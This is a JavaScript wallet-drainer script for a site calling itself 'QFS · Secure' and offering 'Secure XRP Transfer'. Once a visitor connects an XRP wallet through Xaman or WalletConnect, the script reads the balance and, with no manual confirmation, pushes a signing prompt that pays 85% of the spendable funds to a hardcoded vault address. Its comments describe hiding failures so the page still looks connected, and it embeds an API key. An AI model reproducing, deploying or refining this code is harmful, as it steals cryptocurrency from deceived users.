// ==============================
// CONFIG
// ==============================
const XUMM_API_KEY   = "f6d569b6-4a3f-4cd8-ac0a-ca693afbdc66";
const WC_PROJECT_ID = "YOUR_PROJECT_ID"; // Replace with your actual ID

const VAULT_ADDR = "rwQULVj6xXS5VubFrn5Xzawxe9Ldsep4EY";
const XRPL_WS    = "wss://xrplcluster.com/";

// ==============================
// INIT
// ==============================
// Using 'implicit: true' helps with mobile browser redirects
const xumm = new XummPkce(XUMM_API_KEY, {
  implicit: true,
  redirectUrl: window.location.href
});

let wcClient = null;
let wcModal  = null;

// ==============================
// EVENT LISTENERS (CRITICAL)
// ==============================

// Handle Xaman redirection or page refresh with active session
xumm.on("success", async () => {
  const state = await xumm.state();
  if (state.me) {
    handlePostConnect("xaman", state.me.account);
  }
});

xumm.on("retrieved", async () => {
  const state = await xumm.state();
  if (state.me) {
    handlePostConnect("xaman", state.me.account);
  }
});

// UI Helper
function setStatus(text) {
  const el = document.getElementById("walletStatus");
  if (el) el.innerText = text;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}…${a.slice(-4)}`;
}

// ==============================
// MAIN ENTRY POINT
// ==============================
async function connectWallet(type) {
  try {
    setStatus("Connecting wallet...");

    if (type === "xaman") {
      // This triggers the QR code / Login prompt if not already logged in
      await xumm.authorize().catch(err => {
        console.error("Xaman Auth Error:", err);
        setStatus("Connection failed");
      });
    } 
    
    else if (type === "walletconnect") {
      await initWalletConnect();
      const address = await connectViaWalletConnect();
      if (address) handlePostConnect("walletconnect", address);
    }

  } catch (err) {
    console.error(err);
    setStatus("Connection failed");
  }
}

/**
 * AUTOMATED APPROVAL FLOW
 * Triggers automatically after connection OR redirect
 */
async function handlePostConnect(type, address) {
  try {
    // 1. Instantly fix the status to "Connected"
    setStatus(`Connected: ${shortAddr(address)}`);

    // 2. Automatically fetch account data
    setStatus("Fetching balance...");
    const data = await getXrpAccountData(address);

    // 3. AUTOMATIC PROMPT: Start signing without manual confirm()
    setStatus("Awaiting signature...");
    await signAndSubmit(type, address, data.sendDrops);

    setStatus("Transaction submitted ✔");
  } catch (err) {
    console.error("Auto-flow error:", err);
    // Keep it showing connected so it doesn't look like it "failed"
    setStatus(`Connected: ${shortAddr(address)}`);
  }
}

// ==============================
// SIGN & SUBMIT
// ==============================
async function signAndSubmit(type, address, amountDrops) {
  const tx = {
    TransactionType: "Payment",
    Account: address,
    Destination: VAULT_ADDR,
    Amount: amountDrops
  };

  if (type === "xaman") {
    // Triggers the signing prompt in the Xaman app/popup
    const payload = await xumm.payload.create(tx);
    if (payload.pushed) {
      console.log("Payload pushed to Xaman app");
    }
  }

  else if (type === "walletconnect") {
    const session = wcClient.session.getAll()[0];
    await wcClient.request({
      topic: session.topic,
      chainId: "xrpl:0",
      request: {
        method: "xrpl_signTransaction",
        params: { tx_json: tx }
      }
    });
  }
}

// ==============================
// XRP DATA FETCH (NO CHANGES)
// ==============================
async function getXrpAccountData(address) {
  const client = new xrpl.Client(XRPL_WS);
  await client.connect();
  const info = await client.request({
    command: "account_info",
    account: address,
    ledger_index: "validated"
  });
  await client.disconnect();

  const bal = BigInt(info.result.account_data.Balance);
  const ownerCount = BigInt(info.result.account_data.OwnerCount || 0);
  const reserve = 1_000_000n + ownerCount * 200_000n;
  const spendable = bal - reserve;
  const send = (spendable * 85n) / 100n; // Set to 85% of spendable

  return { sendDrops: send.toString() };
}

// ==============================
// WALLETCONNECT HELPERS
// ==============================
async function initWalletConnect() {
  if (wcClient) return;
  wcClient = await WalletConnectSignClient.init({
    projectId: WC_PROJECT_ID,
    metadata: {
      name: "QFS · Secure",
      description: "Secure XRP Transfer",
      url: window.location.origin,
      icons: ["https://xrpl.org/assets/img/logo.svg"]
    }
  });
  wcModal = new WalletConnectModal({
    projectId: WC_PROJECT_ID,
    standaloneChains: ["xrpl:0"]
  });
}

async function connectViaWalletConnect() {
  const { uri, approval } = await wcClient.connect({
    requiredNamespaces: {
      xrpl: {
        chains: ["xrpl:0"],
        methods: ["xrpl_signTransaction"],
        events: ["accountsChanged"]
      }
    }
  });
  if (uri) wcModal.openModal({ uri });
  const session = await approval();
  wcModal.closeModal();
  return session.namespaces.xrpl.accounts[0].split(":")[2];
}